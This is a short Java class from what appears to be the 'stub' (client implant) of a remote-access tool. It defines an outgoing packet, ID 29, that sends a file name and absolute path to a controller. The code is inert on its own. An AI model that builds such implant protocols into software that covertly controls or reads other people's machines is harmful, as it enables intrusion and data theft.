package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;
import com.redpois0n.stub.Connection;

public class Packet29SendFile extends AbstractOutgoingPacket {
	
	private String name;
	private String absolutePath;

	public Packet29SendFile(String name, String absolutePath) {
		this.name = name;
		this.absolutePath = absolutePath;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(name);
		sw.writeLine(absolutePath);
		
		Connection.lock();

	}

	@Override
	public byte getPacketId() {
		return 29;
	}

}
